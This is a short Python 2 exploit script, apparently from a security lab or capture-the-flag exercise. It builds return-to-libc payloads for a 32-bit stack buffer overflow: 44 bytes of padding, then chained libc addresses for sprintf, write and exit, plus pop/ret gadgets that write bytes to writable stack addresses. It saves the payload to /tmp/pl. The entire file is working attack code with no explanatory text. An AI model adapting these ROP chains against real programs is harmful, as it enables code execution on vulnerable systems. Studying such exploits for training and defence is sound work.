#! /usr/bin/python

# tesla_ (gandung@ppp.cylab.cmu.edu)

from struct import pack

start_offset = 0x59a

to_write_offset_0 = pack("<I", 0xbffdf000L + (start_offset))
to_write_offset_1 = pack("<I", 0xbffdf000L + (start_offset + 1))
to_write_offset_2 = pack("<I", 0xbffdf000L + (start_offset + 2))
to_write_offset_3 = pack("<I", 0xbffdf000L + (start_offset + 3))

t0 = pack("<I", 0xbffdf000L + (start_offset + 8))
t1 = pack("<I", 0xbffdf000L + (start_offset + 12))
t2 = pack("<I", 0xbffdf000L + (start_offset + 16))
t3 = pack("<I", 0xbffdf000L + (start_offset + 20))

libc_sprintf = pack("<I", 0xb7e73490)
libc_write = pack("<I", 0xb7f00fe0)
libc_exit = pack("<I", 0xb7e59260)
libc_sprintf_fmt_spec = pack("<I", 0xb7f87e46)
pop1_ret = pack("<I", 0x08048315)
pop4_ret = pack("<I", 0x0804850c)
leave = pack("<I", 0x0804844b)

def format_write_check_payload():
	payload =  "\x41"*(32 + 12)
	payload += libc_write
	payload += pop4_ret
	payload += pack("<I", 1)
	payload += libc_sprintf_fmt_spec
	payload += pack("<I", 2)
	payload += pack("<I", 0xdeadbeef)
	payload += libc_exit
	payload += pop1_ret
	payload += pack("<I", 0x0)

	return ( payload )

def nullify_writable_stack_address_payload():
	payload =  "\x41"*(32 + 12)
	payload += libc_sprintf
	payload += pop4_ret
	payload += to_write_offset_0
	payload += libc_sprintf_fmt_spec
	payload += t0
	payload += pack("<I", 0xdeadbeef)
	payload += libc_sprintf
	payload += pop4_ret
	payload += to_write_offset_1
	payload += libc_sprintf_fmt_spec
	payload += t1
	payload += pack("<I", 0xdeadbeef)
	payload += libc_sprintf
	payload += pop4_ret
	payload += to_write_offset_2
	payload += libc_sprintf_fmt_spec
	payload += t2
	payload += pack("<I", 0xdeadbeef)
	payload += libc_sprintf
	payload += pop4_ret
	payload += to_write_offset_3
	payload += libc_sprintf_fmt_spec
	payload += t3
	payload += pack("<I", 0xdeadbeef)
	payload += libc_write
	payload += pop4_ret
	payload += pack("<I", 0x1)
	payload += to_write_offset_0
	payload += pack("<I", 0x4)
	payload += pack("<I", 0xdeadbeef)
	payload += libc_exit
	payload += pop1_ret
	payload += pack("<I", 0x0)

	return ( payload )

def not_null_stack_address_payload():
	payload =  "\x41"*(32 + 12)
	payload += libc_write
	payload += pop4_ret
	payload += pack("<I", 0x1)
	payload += to_write_offset_0
	payload += pack("<I", 0x4)
	payload += pack("<I", 0xdeadbeef)

	return ( payload )

open("/tmp/pl", "wb").write(nullify_writable_stack_address_payload())
